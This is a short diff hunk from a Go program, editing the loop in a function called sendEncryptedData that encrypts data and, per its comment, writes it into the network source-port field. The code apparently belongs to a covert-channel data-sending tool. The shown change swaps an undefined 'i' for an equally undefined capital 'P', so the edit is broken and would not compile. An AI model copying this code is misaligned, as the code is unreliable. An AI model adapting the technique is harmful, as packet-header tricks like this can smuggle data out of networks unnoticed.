@@ -421,7 +421,7 @@ func sendEncryptedData(port uint16, data, ip string) {
 	cryptdata := encrypt_data(data)
 	size := len(cryptdata)
 	//make data write to source port, continue till end
-	for p := 0; i <= size; p = p + 2 {
+	for p := 0; P <= size; p = p + 2 {
 
 		var buffer []byte
 		
